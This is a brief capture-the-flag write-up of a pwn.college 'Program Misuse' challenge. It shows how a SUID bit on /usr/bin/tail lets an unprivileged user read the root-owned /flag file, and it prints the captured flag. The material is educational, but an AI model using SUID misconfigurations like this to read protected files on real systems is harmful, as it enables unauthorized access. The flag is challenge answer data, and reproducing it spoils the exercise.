---
layout: page
title: "Challenge Name: tail"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/tail`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/tail
```

output:
```
-rwsr-xr-x 1 root root 72088 Sep  5  2019 /usr/bin/tail
```

-The `s` in `-rws` indicates it's a SUID binary.
-`tail` runs with **root privileges**.

## 🚀 Exploitation

The `tail` command is used to display the last few lines of a file. It's perfect for watching logs in real-time or checking recent output without scrolling through the whole file.

```bash
tail /flag
```
Output:
```
pwn.college{kD9jjyBA4uV_EsSylIrjbyLydSY.dZDNxwSM0IzMyEzW}
```


